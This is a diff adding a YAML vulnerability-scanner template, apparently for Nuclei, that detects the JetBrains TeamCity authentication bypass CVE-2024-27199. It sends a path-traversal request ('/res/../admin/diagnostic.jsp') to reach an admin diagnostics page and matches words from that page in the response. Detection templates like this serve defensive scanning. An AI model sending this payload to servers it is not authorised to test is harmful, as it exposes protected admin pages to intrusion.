@@ -1,0 +1,27 @@
+id: jetbrains-teamcity-authentication-bypass
+info:
+  name: JetBrains TeamCity Authentication Bypass Vulnerability (CVE-2024-27199)
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: CVE-2024-27199,authentication-bypass
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/res/../admin/diagnostic.jsp"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "CPU usage (2 cores)"
+      - type: word
+        part: body
+        words:
+          - "Active logging preset"
+      - type: word
+        part: body
+        words:
+          - "Save Thread Dump"
